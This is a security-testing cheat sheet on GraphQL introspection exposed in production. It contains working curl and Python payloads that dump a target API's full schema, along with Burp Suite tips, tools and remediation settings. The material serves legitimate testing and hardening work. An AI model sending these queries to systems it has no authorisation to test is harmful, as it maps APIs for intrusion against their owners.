# GraphQL Introspection Enabled in Production

## Overview
GraphQL introspection allows clients to query the API schema — all types, queries, mutations, and fields. While useful in development, introspection enabled in production is an information disclosure vulnerability that gives attackers a complete roadmap of the API: every endpoint, every parameter, every data type. This dramatically reduces the reconnaissance effort needed to find other vulnerabilities.

## How It Works
- GraphQL's `__schema` and `__type` meta-queries expose the complete type system.
- Attackers send an introspection query and receive a full schema dump.
- From the schema, they identify sensitive queries (internal user listing, admin mutations), hidden fields on types, and understand the exact parameter structure for every operation.
- The schema reveals operation names, argument types, and relationships — everything needed for further exploitation.

## Impact
- Complete API documentation for further attack planning.
- Discovery of sensitive admin queries and mutations.
- Discovery of hidden fields in types (e.g., a `User` type with an `admin` field not visible in the UI).
- Enables targeted testing of every operation without guesswork.
- Disclosure of internal data model and system architecture.

## Where to Look
- `/graphql`, `/api/graphql`, `/gql`, `/query`
- Any endpoint accepting POST requests with `Content-Type: application/json` and a GraphQL body.
- Apollo Server, Hasura, Prisma, and other GraphQL backends.

## Testing Steps
1. Send an introspection query to the GraphQL endpoint.
2. Check if the response contains `__schema` data.
3. If successful, parse the schema to enumerate all types, queries, and mutations.
4. Look for admin mutations, internal queries, and sensitive type fields.
5. Try partial introspection if full introspection is blocked (`__type` queries for specific types).
6. Check if introspection works with or without authentication.

## Payloads / Techniques
```bash
# Basic introspection query
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}' | python3 -m json.tool

# Full schema introspection
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          kind name description
          fields(includeDeprecated: true) {
            name description isDeprecated
            args { name type { kind name ofType { kind name } } }
            type { kind name ofType { kind name ofType { kind name } } }
          }
          inputFields { name description type { kind name } }
          enumValues(includeDeprecated: true) { name description }
        }
      }
    }"
  }' | python3 -m json.tool

# Type-specific query (works even with partial introspection blocks)
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __type(name: \"User\") { fields { name type { name kind } } } }"}'
```

```python
# Using graphql-introspection-query parser
# Install: pip install graphql-core
import requests
import json

ENDPOINT = "https://target.com/graphql"
TOKEN = "your_token_here"

introspection_query = """
query {
  __schema {
    types { name kind fields { name } }
  }
}
"""

r = requests.post(ENDPOINT,
    headers={"Authorization": f"Bearer {TOKEN}",
             "Content-Type": "application/json"},
    json={"query": introspection_query})

schema = r.json()
types = schema['data']['__schema']['types']
for t in types:
    if t['kind'] in ('OBJECT', 'INPUT_OBJECT') and not t['name'].startswith('__'):
        fields = [f['name'] for f in (t.get('fields') or [])]
        print(f"\n{t['name']}: {fields}")
```

## Burp Suite Tips
- In **Repeater**, send an introspection query to `/graphql` — analyze the response.
- **InQL** (BApp Store extension) automates introspection and generates a queryable schema in Burp.
- Use **GraphQL Raider** (BApp) for advanced GraphQL testing.
- Check the full schema output for sensitive query/mutation names that look out of scope for regular users.

## Tools
- InQL (Burp BApp) — https://github.com/doyensec/inql
- GraphQL Voyager — https://graphql-kit.com/graphql-voyager/ (schema visualization)
- Altair GraphQL Client — GUI for testing GraphQL APIs
- clairvoyance — https://github.com/nicholasess/clairvoyance (GraphQL schema enumeration without introspection)

## Remediation
- Disable introspection in production:
  - Apollo Server: `introspection: false` in server config
  - GraphQL Yoga: `maskedErrors` + `disableIntrospection: true`
  - Hasura: environment variable `HASURA_GRAPHQL_ENABLE_INTROSPECTION: false`
- If introspection must remain enabled, restrict it to authenticated admin users only.
- Use query depth limiting and query complexity analysis to prevent abuse of the exposed schema.
- Implement field-level authorization even if schema is discoverable.

## References
https://owasp.org/www-project-api-security/ (API9:2023 Improper Inventory Management)
https://portswigger.net/web-security/graphql
https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
https://graphql.org/learn/introspection/
